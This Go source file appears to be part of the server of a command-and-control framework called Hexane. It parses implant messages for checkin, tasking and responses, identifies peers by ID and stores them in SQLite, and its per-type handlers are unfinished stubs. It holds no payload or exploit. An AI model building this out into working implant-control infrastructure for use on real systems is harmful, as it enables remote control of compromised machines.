package core

import (
	"fmt"
	"math/bits"
)

// parse response, push to database then print?
const HeaderLength = 12

func ProcessBodyToParser(body []byte) (*Parser, uint32) {
	var offset uint32

	parser := CreateParser(body)
	if parser.MsgLength < HeaderLength {
		return nil, 0
	}
	if parser.MsgLength >= HeaderLength+4 {
		offset = parser.ParseDword()
		offset += HeaderLength + 4
	} else {
		offset = HeaderLength
	}

	if offset > parser.MsgLength {
		return nil, 0
	}

	return parser, offset
}

func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
	var (
		err error
		rsp []byte
	)

	// todo: command data per config (CommandChannel)
	switch parser.MsgType {
	case TypeCheckin:
		// process/print checkin data
		// return PID
	case TypeTasking:
		// process task request. print nothing
		// return any tasking data (if available)
	case TypeResponse:
		// process/print response data
		// return any tasking data (if available)
	default:
		return nil, fmt.Errorf("unknown msg type: %v", parser.MsgType)
	}

	return rsp, nil
}

func ResponseWorker(body []byte) ([]byte, error) {
	var (
		err    error
		offset uint32
		parser *Parser
		config *HexaneConfig
		rsp    []byte
	)

	for len(body) > 0 {
		if parser, offset = ProcessBodyToParser(body); parser == nil {
			return nil, fmt.Errorf("processing message body to parser: bad parser or message length")
		}

		parser.PeerId = bits.ReverseBytes32(parser.ParseDword())
		parser.TaskId = bits.ReverseBytes32(parser.ParseDword())
		parser.MsgType = bits.ReverseBytes32(parser.ParseDword())

		// peer is confirmed by PID. Probably not the safest method
		if config = GetConfigByPeerId(parser.PeerId); config != nil {
			if err = config.SqliteInsertParser(parser); err != nil {
				return []byte("200 ok"), err
			}
			if rsp, err = config.ProcessParser(parser); err != nil {
				return []byte("200 ok"), err
			}
		} else {
			WrapMessage("ERR", fmt.Sprintf("could not find peer in the database: %d", parser.PeerId))
			rsp = []byte("200 ok")
		}

		body = body[offset:]
	}

	return rsp, err
}
